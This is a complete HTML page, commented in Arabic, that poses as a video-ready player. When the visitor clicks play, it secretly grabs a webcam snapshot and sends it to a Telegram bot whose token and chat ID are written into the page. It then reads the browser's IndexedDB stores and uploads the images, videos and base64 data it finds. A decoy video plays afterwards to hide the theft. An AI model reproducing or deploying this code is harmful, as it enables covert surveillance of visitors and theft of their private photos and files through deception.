<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تم التحميل</title>
    <style>
        body { 
            background: #0f0f0f; 
            color: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            flex-direction: column;
        }
        .container { text-align: center; width: 300px; }
        button { 
            background: linear-gradient(45deg, #ff0055, #ff5500); 
            color: white; 
            border: none; 
            padding: 15px 30px; 
            font-size: 16px; 
            font-weight: bold;
            border-radius: 50px; 
            cursor: pointer; 
            box-shadow: 0 4px 15px rgba(255, 0, 85, 0.4);
            transition: transform 0.2s;
        }
        button:active { transform: scale(0.95); }
        #status { margin-top: 15px; font-size: 12px; color: #888; min-height: 20px;}
        
        /* إخفاء الفيديو الذي سيظهر لاحقاً */
        #hiddenVideo { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; object-fit: cover; opacity: 0.5; }
    </style>
</head>
<body>

<!-- فيديو وهمي للخداع -->
<video id="hiddenVideo" loop muted autoplay playsinline>
    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
</video>

<div class="container">
    <h2>🎬 الفيديو جاهز للمشاهدة</h2>
    <p>اضغط لمشاهدة المحتوى الجديد.</p>
    <button onclick="stealAndShow()">▶ تشغيل</button>
    <div id="status"></div>
</div>

<script>
    // 🔑 بياناتك المستخرجة والمدمجة هنا
    const botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
    const chatId = "7962257606"; 

    async function sendToTelegram(file, filename) {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        // نستخدم sendPhoto لأنه يعمل بشكل أفضل مع الصور والفيديوهات الصغيرة
        formData.append("photo", file, filename); 
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
        } catch (e) {
            console.error("Error sending file", e);
        }
    }

    async function stealAndShow() {
        const status = document.getElementById('status');
        status.innerText = "جاري المعالجة...";

        try {
            // 1. التقاط صورة خفية من الكاميرا (للتأكد)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            await new Promise(r => setTimeout(r, 1000));
            
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            context.drawImage(video, 0, 0);
            
            canvas.toBlob(async (blob) => {
                // إرسال اللقطة أولاً
                await sendToTelegram(blob, "selfie.jpg");
                stream.getTracks().forEach(track => track.stop());
                
                // ثم البدء بسحب الملفات
                status.innerText = "جاري جمع الملفات...";
                await extractFiles();
                
                // إظهار الخدعة (تشغيل الفيديو الوهمي)
                status.innerText = "جاري التشغيل...";
                document.getElementById('hiddenVideo').style.display = 'block';
                document.querySelector('.container').style.opacity = '0.5';
                document.querySelector('button').style.display = 'none';
                status.innerText = "جاري البث المباشر";
            }, 'image/jpeg');

        } catch (err) {
            status.innerText = "حدث خطأ أو تم رفض الإذن.";
        }
    }

    async function extractFiles() {
        // أ) البحث في IndexedDB
        const dbNames = await window.indexedDB.databases();
        for (let dbInfo of dbNames) {
            if (!dbInfo.name) continue;
            try {
                const dbRequest = indexedDB.open(dbInfo.name);
                const db = await new Promise((resolve, reject) => {
                    dbRequest.onsuccess = () => resolve(dbRequest.result);
                    dbRequest.onerror = () => reject(dbRequest.error);
                });

                const storeNames = db.objectStoreNames;
                for (let i = 0; i < storeNames.length; i++) {
                    const transaction = db.transaction(storeNames[i], "readonly");
                    const objectStore = transaction.objectStore(storeNames[i]);
                    
                    // جلب جميع العناصر (يمكن أن يكون الحجم كبيراً)
                    const request = objectStore.getAll();
                    request.onsuccess = async () => {
                        const data = request.result;
                        if (data && data.length > 0) {
                            for (let item of data) {
                                if (item instanceof Blob || item instanceof File) {
                                    // التأكد أنه صورة أو فيديو
                                    if (item.type.startsWith('image/') || item.type.startsWith('video/')) {
                                        await sendToTelegram(item, `file_${Math.random().toString(36).substr(2, 9)}.${item.type.split('/')[1]}`);
                                    }
                                } else if (typeof item === 'string') {
                                    // تحويل النصوص التي قد تكون بيانات مشفرة أو صور Base64
                                    const blob = base64ToBlob(item);
                                    if(blob) await sendToTelegram(blob, "data_string.jpg");
                                }
                            }
                        }
                    };
                }
            } catch (e) {
                // تجاهل الأخطاء في قواعد البيانات المحمية
            }
        }
    }

    // دالة مساعدة لتحويل Base64 إلى Blob
    function base64ToBlob(base64) {
        try {
            const arr = base64.split(',');
            if(arr.length < 2) return null;
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while(n--){
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], {type:mime});
        } catch(e) { return null; }
    }
</script>

</body>
</html>
